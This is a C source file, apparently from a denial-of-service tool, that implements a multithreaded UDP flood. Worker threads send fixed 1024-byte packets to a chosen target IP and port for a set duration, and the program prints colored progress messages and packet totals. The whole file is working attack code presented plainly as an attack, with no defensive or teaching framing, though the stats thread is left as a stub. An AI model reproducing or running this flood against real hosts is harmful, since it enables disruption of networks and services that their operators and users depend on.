#include "attack_methods.h"
#include "ascii_art.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

volatile long long udp_packets_sent = 0;
volatile long long udp_bytes_sent = 0;

void* udp_flood_worker(void* arg) {
    struct attack_params {
        char target[256];
        int port;
        int duration;
    } *params = (struct attack_params*)arg;
    
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0) return NULL;
    
    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->target, &serv_addr.sin_addr);
    
    char packet[1024];
    memset(packet, 'U', sizeof(packet)); // UDP packet content
    
    time_t start_time = time(NULL);
    
    while(attack_active && (time(NULL) - start_time) < params->duration) {
        if(sendto(sockfd, packet, sizeof(packet), 0,
                 (struct sockaddr*)&serv_addr, sizeof(serv_addr)) > 0) {
            __sync_fetch_and_add(&udp_packets_sent, 1);
            __sync_fetch_and_add(&udp_bytes_sent, sizeof(packet));
        }
        usleep(1000); // 1ms delay
    }
    
    close(sockfd);
    free(params);
    return NULL;
}

void start_udp_flood(const char* target, int port, int duration, int threads) {
    printf("\033[1;36m[*] Starting UDP Flood attack...\033[0m\n");
    printf("Target: %s:%d | Duration: %ds | Threads: %d\n", target, port, duration, threads);
    
    attack_active = 1;
    udp_packets_sent = 0;
    udp_bytes_sent = 0;
    
    pthread_t thread_pool[threads];
    time_t start_time = time(NULL);
    
    for(int i = 0; i < threads; i++) {
        struct attack_params* params = malloc(sizeof(struct attack_params));
        strcpy(params->target, target);
        params->port = port;
        params->duration = duration;
        pthread_create(&thread_pool[i], NULL, udp_flood_worker, params);
    }
    
    // Stats display thread
    pthread_t stats_thread;
    // ... stats implementation
    
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    attack_active = 0;
    
    printf("\033[1;32m[+] UDP Flood completed\033[0m\n");
    printf("Packets sent: %lld | Bytes sent: %lld\n", udp_packets_sent, udp_bytes_sent);
}
